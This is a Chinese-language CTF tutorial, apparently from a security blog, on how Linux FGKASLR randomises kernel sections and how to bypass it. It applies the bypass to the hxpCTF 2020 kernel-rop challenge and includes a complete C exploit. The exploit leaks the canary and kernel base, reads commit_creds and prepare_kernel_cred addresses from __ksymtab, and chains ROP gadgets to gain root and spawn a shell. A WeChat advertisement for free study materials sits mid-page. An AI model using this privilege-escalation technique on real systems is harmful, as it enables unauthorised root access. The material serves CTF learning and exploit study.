# FGKASLR

FGASLR（Function Granular
KASLR）是KASLR的加强版，增加了更细粒度的地址随机化。因此在开启了FGASLR的内核中，即使泄露了内核的程序基地址也不能调用任意的内核函数。

## layout_randomized_image

在[fgkaslr.c](https://github.com/kaccardi/linux/blob/fg-kaslr/arch/x86/boot/compressed/fgkaslr.c)文件中存在着随机化的明细。

    
    
    /*  
    linux/arch/x86/boot/compressed/fgkaslr.c  
    */  
    void layout_randomized_image(void *output, Elf64_Ehdr *ehdr, Elf64_Phdr *phdrs)  
    {  
    ...  
    shnum = ehdr->e_shnum; //获取节区的数量  
    shstrndx = ehdr->e_shstrndx; //获取字符串的索引  
    ...  
    /* we are going to need to allocate space for the section headers */  
    sechdrs = malloc(sizeof(*sechdrs) * shnum); //开辟一段空间用于防止节区头部  
    if (!sechdrs)  
    error("Failed to allocate space for shdrs");  
    ​  
    sections = malloc(sizeof(*sections) * shnum); //开辟一段空间用户防止节区的内容  
    if (!sections)  
    error("Failed to allocate space for section pointers");  
    ​  
    memcpy(sechdrs, output + ehdr->e_shoff,  
    sizeof(*sechdrs) * shnum); //拷贝头部数据  
    ​  
    /* we need to allocate space for the section string table */  
    s = &sechdrs[shstrndx]; //获取节区名  
    ​  
    secstrings = malloc(s->sh_size); //开辟一段空间用于防止节区名称  
    if (!secstrings)  
    error("Failed to allocate space for shstr");  
    ​  
    memcpy(secstrings, output + s->sh_offset, s->sh_size); //拷贝节区名称  
    ​  
    /*  
    * now we need to walk through the section headers and collect the  
    * sizes of the .text sections to be randomized.  
    */  
    for (i = 0; i < shnum; i++) { //遍历节区，选择需要重定位的节区  
    s = &sechdrs[i];  
    sname = secstrings + s->sh_name;  
    ​  
    if (s->sh_type == SHT_SYMTAB) { //遇到符号节区跳过  
    /* only one symtab per image */  
    if (symtab)  
    error("Unexpected duplicate symtab");  
    ​  
    symtab = malloc(s->sh_size);  
    if (!symtab)  
    error("Failed to allocate space for symtab");  
    ​  
    memcpy(symtab, output + s->sh_offset, s->sh_size);  
    num_syms = s->sh_size / sizeof(*symtab);  
    continue;  
    }  
    ...  
    if (!strcmp(sname, ".text")) { //第一个.text的节区直接跳过  
    if (text)  
    error("Unexpected duplicate .text section");  
    text = s;  
    continue;  
    }  
    ​  
    if (!strcmp(sname, ".data..percpu")) { //遇到.data..precpu的节区也直接跳过  
    /* get start addr for later */  
    percpu = s;  
    continue;  
    }  
    ​  
    if (!(s->sh_flags & SHF_ALLOC) ||  
    !(s->sh_flags & SHF_EXECINSTR) ||  
    !(strstarts(sname, ".text"))) //若一个节区具有SHF_ALLOC与SHF_EXECINSTR的标志位，并且节区名的前缀属于.text则会进行细粒度的地址随机化  
    continue;  
    ​  
    sections[num_sections] = s; //剩余的节区都放置到新开辟的空间中，进行细粒度的地址随机化  
    num_sections++;  
    }  
    sections[num_sections] = NULL;  
    sections_size = num_sections;  
    ...  
    }

通过上述代码分析可知

  * 符号节区不进行细粒度的地址随机化

  * 第一个`.text`节是不会进行细粒度的地址随机化

  * 需要同时具备`SHF_ALLOC`与`SHF_EXECINSTR`标志位，并且节区的前缀为`.text`才会被选择进行细粒度的地址随机化

可以看到`layout_randomized_image`函数还是会保持原有的节区偏移，但是会在内存中寻找另一个空间进行存储，这就导致在内核开启了FGKASLR保护时并不是所有的节区都以内核程序基地址作为基址进行偏移，想要做到任意内核函数的调用，就需要找到调用函数所处的节区的基地址，使得利用更加复杂化了。

## FGKASLR保护的绕过

想要绕过FGKASLR，我们可以挑选不受影响的节区中的`gadget`进行`ROP`链的构造。

首先是不存在`SHF_ALLOC`与`SHF_EXECINSTR`标志位的节区

![image-20230703202123018](https://image.3001.net/images/20230710/1688949716_64ab53d48ffb9ffd70ed7.png!small)

其次是`.text`的节区，可以看到该节区存在`0x200000`的大小，因此可以挑选`0xffffffff81000000 -0xffffffff81000000 + 0x200000`，可选的`gadget`还是比较充足的。

![image-20230703202341608](https://image.3001.net/images/20230710/1688949721_64ab53d98e8ff347e4f28.png!small)

上述的节区都是不受FGKASLR保护的影响，只需要泄露出内核程序的基地址，就可以按照绕过KASLR的思路进行漏洞的利用。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

想要在内核态完成提权返回到用户态，我们需要调用`commit_creds(prepare_kernel_cred(0)) -> swapgs ->
iretq`

因此先来看`commit_creds`与`prepare_kernel_cred`函数是否符合要求，可以看到`commit_creds`函数的地址为`0xffffffff814c6410`，`prepare_kernel_cred`函数的地址为`0xffffffff814c67f0`都是超过`.text`的节区空间了（这里我是关闭了KASLR的）。

![image-20230703203853456](https://image.3001.net/images/20230710/1688949722_64ab53dacf52058e9026a.png!small)

可以多运行几次环境，查看这个两个函数的地址，会发现末尾地址的偏移会一直在变化。(开启了KASLR)

`cat /proc/kallsyms | grep -E "commit_creds|prepare_kernel_cred"`

 **第一次**

![image-20230703204358552](https://image.3001.net/images/20230710/1688949724_64ab53dc1ce7a6e2e4808.png!small)

 **第二次**

![image-20230703204436120](https://image.3001.net/images/20230710/1688949725_64ab53dd4d2e0be06677c.png!small)

可以看到第一次运行与第二次运行的地址是完全不一样的，但是处于不进行细粒度的节区`ksymtab`，只有中间的九个比特位（KASLR）发生了改变，其余部分是一致的。这也是`KASLR`与`FGKASLR`的区别。但是实际的利用又需要用到这两个函数，因此还是需要特殊的手法泄露出这两个函数的实际地址。（1）能够泄露这两个函数现有的基地址（2）通过符号表进行地址读取。

这里采用（2）的手法进行函数地址的泄露，`ksymtab`节存放着内核函数的符号表，使用下述结构体进行维护。

    
    
    struct kernel_symbol {  
    int value_offset;  
    int name_offset;  
    int namespace_offset;  
    };

  * `value_offset`：内核符号的值的偏移

  * `name_offset`：内核符号的名称的偏移

  * `namespace_offset`：内核符号所属的命名空间的名称在内存中的偏移量或地址。

因此`value_offset`正是我们所关注的，这里需要注意的是这里的偏移地址是基于当前地址的偏移。以`ksymtab_commit_creds`为例，`ksymtab_commit_creds`的地址值为`0xffffffffa8587d90`，该地址存储的值为`0xffa17ef0`，计算的结果为`0xffffffffa8587d90-(2^32 - 0xffa17ef0) =
0xffffffffa7f9fc80`，结果刚好是`commit_creds`函数的地址值，这里说明一下为什么需要用`(2^32 -0xffa17ef0)`，因为`value_offset`是`int`类型，而`0xffa17ef0`是负数，因此需要先转换在进行相减才是实际值。

![image-20230703210116622](https://image.3001.net/images/20230710/1688949726_64ab53de64c38e3799d37.png!small)

那么利用上述的方法就可以求出`commit_creds`与`prepare_kernel_cred`函数的地址。

那么接着看如何获取`swapgs`与`iretq`指令的地址，之前在介绍如何绕过`kpti`时介绍过一个特殊的函数`swapgs_restore_regs_and_return_to_usermode`，里面除了能够通过`cr3`转换页表，里面还具备`swapgs`和`iretq`指令。在内核中搜索一下这个函数的地址，可以发现它处于`.text`节区的范围内，因此这个地址可以直接拿来用。

![image-20230703210936389](https://image.3001.net/images/20230710/1688949727_64ab53df8bd24ea0adea7.png!small)

因此绕过`FGKASLR`的方法就出来了，首先是泄露内核程序基地址，通过该基地址获得`__ksymtab_commit_creds`与`__ksymtab_prepare_kernel_cred`的地址，通过上述两个符号获取实际的`commit_creds`与`prepare_kernel_cred`函数的地址，最后通过`swapgs_restore_regs_and_return_to_usermode`函数返回用户态。

# hxpCTF 2020 kernel-rop

## run.sh

    
    
    qemu-system-x86_64 \  
    -m 128M \  
    -cpu kvm64,+smep,+smap \  
    -kernel vmlinuz \  
    -initrd initramfs.cpio.gz \  
    -hdb flag.txt \  
    -snapshot \  
    -nographic \  
    -monitor /dev/null \  
    -no-reboot \  
    -append "console=ttyS0  kaslr kpti=1  quiet panic=1" \  
    -s

这里还是使用 hxpCTF 2020的内核题作为例子

项目地址：<https://github.com/h0pe-ay/Kernel-Pwn>

之前提到过了程序存在栈溢出的漏洞，并且允许我们读取内核栈上的数据，通过读取内核栈上的数据可以泄露出`canary`的值以及程序的基地址，这里需要特别注意的是，当开启了`FGKASLR`时，不是所有的地址都可以用来计算基地址的，只能找在`.text`范围内的地址，否则是无法计算出内核程序基地址。因此这里选择`0xffffffff8100a157`的地址作为泄露地址。

![image-20230703211839527](https://image.3001.net/images/20230710/1688949728_64ab53e0aefc8408d5df9.png!small)

那么在泄露了`canary`和地址之后就可以利用栈溢出完成提权返回用户态了，在之前的用户态下的利用，我们可以借助`write`或者是`puts`函数去读取地址中的内容，但是在内核态的利用则不需要这么麻烦了，例如可以先将`__ksymtab_commit_creds`地址赋值给`rax`寄存器，接着通过`mov
rax，[rax]; ret`的指令完成对指定地址完成读取操作。这里我使用的`gadget`为

    
    
    0xffffffff81004d11: pop rax; ret; [0x4d11]  
    0xffffffff81015a7f: mov rax, qword ptr [rax]; pop rbp; ret; [0x15a7f]

首先利用`pop rax; ret`指令，将`__ksymtab_commit_creds`函数的地址赋值给`rax`寄存器，接着使用`mov rax,
qword ptr
[rax];`函数将`__ksymtab_commit_creds`地址的内容读取到`rax`寄存器中，那么接下来就是如何提取出`rax`寄存器。可以借助`swapgs_restore_regs_and_return_to_usermode`函数先暂时返回到用户态，接着采用内联汇编，进行值的提取。
**这里需要注意的是需要将`ROP`链与内联汇编分隔开，否则`rax`寄存器可能会被编译器优化掉，即会有清空`rax`寄存器的操作**。并且所有找的`gadget`都必须是不会进行细粒度调整的节区中挑选，否则无法获取真实地址。

    
    
    ...  
    void start()  
    {  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = image_base +  0x4d11; //pop_rax_ret  
    payload[index++] = image_base + 0xf87d90; //__ksymtab_commit_creds  
    payload[index++] = image_base + 0x15a7f; // mov rax, qword ptr [rax]; pop rbp; ret;  
    payload[index++] = 0;  
    payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)leak_commit_creds;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);  
      
    }  
    ​  
    void leak_commit_creds()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov commit_creds_offset, eax;"  
    ".att_syntax;"  
    );  
    printf("commit_cred_offset:0x%x\n", commit_creds_offset);  
    commit_creds = image_base + 0xf87d90 + (int)commit_creds_offset;  
    printf("commit_cred:0x%lx\n", commit_creds);  
    jmp_leak_prepare_kernel_cred();  
    }  
    ...

在调用为`prepare_kernel_cred`后需要将`rax`寄存器的值传递给`rdi`寄存器中，因为需要作为`commit_creds`函数的参数。但是在`.text`中找了很久都没有合适的`gadget`，那么还是同样采用内联汇编，将`rax`寄存器的值读取出，再传递给`commit_creds`函数即可。
**这里又需要特别注意，最好不要使用太多的全局变量存储，否则会覆盖一开始保存的user_cs，user_rflags，user_sp，user_ss的变量值。**
因此在`payload`中我特定将这几个变量初始化的特定的值，使得这几个变量存储在`.data`段防止被其它的值覆盖。

![image-20230703214402506](https://image.3001.net/images/20230710/1688949730_64ab53e2751fd7c22a6dc.png!small)

因此针对`FGKASLR`保护的绕过，实际是利用`FGKASLR`特点，只在特定的区域中选取适合的`gadget`，从而将`FGKASLR`弱化为`KASLR`，进而继续利用。

## exp

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    ​  
    /*  
    0xffffffff81006370: pop rdi; ret;  --  [0x6370]  
    0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode -- [0x200f10]  
    0xffffffff81004d11: pop rax; ret; [0x4d11]  
    0xffffffff81015a7f: mov rax, qword ptr [rax]; pop rbp; ret; [0x15a7f]  
    0xffffffff81f87d90 r __ksymtab_commit_creds [0xf87d90]  
    0xffffffff81f8d4fc r __ksymtab_prepare_kernel_cred [0xf8d4fc]  
    */  
    ​  
    //iretq RIP|CS|RFLAGS|SP|SS   
    #define MAX 1  
    int fd;  
    unsigned long user_cs = MAX,user_rflags = MAX,user_sp = MAX,user_ss = MAX;  
    ​  
    unsigned long image_base;  
    unsigned long commit_creds;  
    unsigned long prepare_kernel_cred;  
    unsigned long canary;  
    ​  
    int prepare_kernel_cred_offset;  
    int commit_creds_offset;  
    unsigned long cred;  
    ​  
    ​  
    void save_state();  
    void backdoor();  
    void leak_commit_creds();  
    void leak_prepare_kernel_cred();  
    void get_cred();  
    void jmp_get_cred();  
    void jmp_leak_prepare_kernel_cred();  
    void jmp_get_cred();  
    void jmp_back_door();  
    void start();  
    ​  
    ​  
    void save_state()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("***save state***");  
    printf("user_cs:0x%lx\n", user_cs);  
    printf("user_sp:0x%lx\n", user_sp);  
    printf("user_ss:0x%lx\n", user_ss);  
    printf("user_rflags:0x%lx\n", user_rflags);  
    puts("***save finish***");  
    }  
    ​  
    void backdoor()  
    {  
    puts("***getshell***");  
    system("/bin/sh");  
    }  
    ​  
    void start()  
    {  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = image_base +  0x4d11; //pop_rax_ret  
    payload[index++] = image_base + 0xf87d90; //__ksymtab_commit_creds  
    payload[index++] = image_base + 0x15a7f; // mov rax, qword ptr [rax]; pop rbp; ret;  
    payload[index++] = 0;  
    payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)leak_commit_creds;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);  
      
    }  
    ​  
    void leak_commit_creds()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov commit_creds_offset, eax;"  
    ".att_syntax;"  
    );  
    printf("commit_cred_offset:0x%x\n", commit_creds_offset);  
    commit_creds = image_base + 0xf87d90 + (int)commit_creds_offset;  
    printf("commit_cred:0x%lx\n", commit_creds);  
    jmp_leak_prepare_kernel_cred();  
    }  
    ​  
    void jmp_leak_prepare_kernel_cred()  
    {  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = image_base +  0x4d11; //pop_rax_ret  
    payload[index++] = image_base + 0xf8d4fc; //__ksymtab_prepare_kernel_cred  
    payload[index++] = image_base + 0x15a7f; // mov rax, qword ptr [rax]; pop rbp; ret;  
    payload[index++] = 0;  
    payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)leak_prepare_kernel_cred;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);    
    }  
    ​  
    ​  
    void leak_prepare_kernel_cred()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov prepare_kernel_cred_offset, rax;"  
    ".att_syntax;"  
    );  
    printf("prepare_kernel_cred_offset:0x%x\n", prepare_kernel_cred_offset);  
    prepare_kernel_cred = image_base + 0xf8d4fc + (int)prepare_kernel_cred_offset;  
    printf("prepare_kernel_cred:0x%lx\n", prepare_kernel_cred);  
    printf("jmp get cred\n");  
    jmp_get_cred();  
    }  
    ​  
    void jmp_get_cred()  
    {  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = image_base +  0x6370; //pop_rdi_ret  
    payload[index++] = 0;  
    payload[index++] = prepare_kernel_cred; // prepare_kernel_cred  
    payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)get_cred;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);    
      
    }  
    ​  
    ​  
    void get_cred()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov cred, rax;"  
    ".att_syntax;"  
    );  
    printf("cred:0x%lx\n", cred);  
    jmp_back_door();  
    }  
    ​  
    void jmp_back_door()  
    {  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = image_base +  0x6370; //pop_rdi_ret  
    payload[index++] = cred;         //cred  
    payload[index++] = commit_creds; // commit_creds  
    payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)backdoor;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);    
    }  
    ​  
    int main()  
    {  
    save_state();  
    fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 40 * 8);  
    for(int i = 0; i < 40; i++)  
    printf("i:%d\taddress:0x%lx\n",i, buf[i]);  
    canary = buf[2];  
    unsigned long leak_addr = buf[38];  
    printf("leak addr:0x%lx\n", leak_addr);  
    image_base = leak_addr - 0xa157;  
    printf("ImageBase:0x%lx\n", image_base);  
    start();  
    }

###  **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

  

